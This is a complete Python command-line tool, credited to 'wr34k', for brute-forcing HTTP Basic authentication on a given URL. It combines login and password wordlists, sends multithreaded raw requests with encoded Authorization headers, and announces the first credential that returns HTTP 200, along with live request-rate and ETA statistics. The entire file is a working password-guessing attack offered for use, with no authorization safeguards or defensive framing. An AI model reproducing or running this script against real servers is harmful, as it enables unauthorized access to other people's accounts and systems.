#!/usr/bin/python3

import sys
import socket
import ssl
import time
from base64 import b64encode
from argparse import ArgumentParser
from threading import Thread, Lock

thread_num = None

batch_size = None
credlist = list()

lock = Lock()
over = False

total = current = 0

class Protocol:
    PLAIN = 0
    SSL = 1

def getargs():
    p = ArgumentParser()
    p.add_argument("-u", "--url", help="URL to bruteforce", required=True)

    login_grp = p.add_mutually_exclusive_group(required=True)
    login_grp.add_argument("-l", help="Single login to use")
    login_grp.add_argument("-L", help="Login file to use")

    passwd_grp = p.add_mutually_exclusive_group(required=True)
    passwd_grp.add_argument("-p", help="Single password to use")
    passwd_grp.add_argument("-P", help="Password file to use")

    p.add_argument("-t", "--threads", help="Total (false) threads to use (fuck you python)", required=False, default="100", type=int)

    return p.parse_args()

def parse_url(url):
    proto = Protocol.PLAIN
    if url.find("http://") != -1 or url.find("https://") != -1:
        if url.find("https://") != -1:
            port = 443
            url = url[8:]
            proto = Protocol.SSL
        else:
            port = 80
            url = url[7:]
    else:
        port = 80
    if url.find("/") != -1:
        domain = url[:url.index("/")]
    else:
        domain = url

    if domain.find(":") != -1:
        port = int(domain.split(":")[1])
        domain = domain.split(":")[0]

    if url.find("/") != -1:
        path = url[url.index("/"):]
    else:
        path = ""
    ip = socket.gethostbyname(domain)
    return (ip, port, proto, domain, path)


def error(msg):
    print("\033[31m{}\033[0m".format(msg))
    sys.exit(1)

def main():
    global credlist, lock, batch_size, total
    args = getargs()

    print("Brute-force basic auth !")
    print("Made by wr34k")

    try:
        parsed_url = parse_url(args.url)
    except:
        error("Unable to parse url {}".format(args.url))

    thread_num = args.threads

    logins = passwords = list()
    logins = [args.l] if args.l else listfromfile(args.L)
    passwords = [args.p] if args.p else listfromfile(args.P)


    for l in logins:
        for p in passwords:
            credlist.append(l+":"+p)

    total = len(credlist)
    print("Logins: {}, Passwds: {}, total: {}".format ( \
        len(logins), \
        len(passwords), \
        total \
    ))
    batch_size = len(credlist) // thread_num + (len(credlist) % thread_num > 0)
    threads = list()
    t0 = time.time()

    print("Starting {} thread(s)... ({} reqs per thread)".format(thread_num, batch_size))
    for t in range(thread_num):
        threads.append(Thread(target=worker, args=(parsed_url)))
        threads[t].daemon = True
        threads[t].start()

    t = Thread(target=stats)
    t.daemon = True
    t.start()
    threads.append(t)

    for t in threads:
        try:
            t.join(600)
        except KeyboardInterrupt:
            print("Ctrl+C hit. Exiting...")
            return

    print("\nFinished in {} seconds".format(int(time.time() - t0)))



def worker(ip, port, proto, domain, path):
    global credlist, over, current
    while not over:
        with lock:
            local = list()
            if len(credlist) >= batch_size:
                local = credlist[:batch_size]
                credlist = credlist[batch_size:]
            elif len(credlist) == 0:
                return
            else:
                local = credlist
                credlist=[]

        for cred in local:
            if over:
                return
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            if proto == Protocol.SSL:
                s = ssl.wrap_socket(s)
            s.connect((ip, port))
            s.send(req(domain, path, cred))
            try:
                sc = int(s.recv(1024).decode('utf-8', 'ignore').split("\r\n")[0].split()[1])
            except ValueError:
                print("error @ recv()")
                exit()
            s.close()
            if sc == 200:
                print("\n\nw00t w00t! - \033[32m{}\033[0m\n".format(cred))
                over = True
            current += 1

def stats():
    rnd = 0
    current_0 = current
    to = time.time()
    arrrps = [0, 0, 0, 0, 0]
    arreta = [0, 0, 0, 0, 0]
    while not over:
        time.sleep(1)

        arrrps += [int((current - current_0) / (time.time() - to))]
        rps = int(sum(arrrps[-5:]) / 5)
        arrrps = arrrps[-5:]

        arreta += [int((total - current) / rps)]
        eta = int(sum(arreta[-5:]) / 5)
        arreta = arreta[-5:]
        if rnd >= 5:
            sys.stdout.write("Stats: Requests made: {}/{} | Speed: {} r/s | ETA: {}s                           \r".format( \
                current \
                ,total \
                ,rps \
                ,eta \
            ))
        else:
            sys.stdout.write("Stats: Requests made: {}/{}                                                      \r".format( \
                current \
                ,total \
            ))

        rnd+=1


def req(domain, path, creds):
    req =  "GET {} HTTP/1.1\n".format(path)
    req += "Host: {}\n".format(domain)
    req += "Authorization: Basic " + b64encode(bytes(creds, 'utf-8')).decode('utf-8') + "\r\n\r\n"
    return bytes(req, 'utf-8')

def listfromfile(filename):
    data = list()
    for line in [line.decode('utf-8', 'ignore').replace("\n", "") for line in open(filename, "rb") if line]:
        data.append(line)
    return data


if __name__=='__main__':
    main()
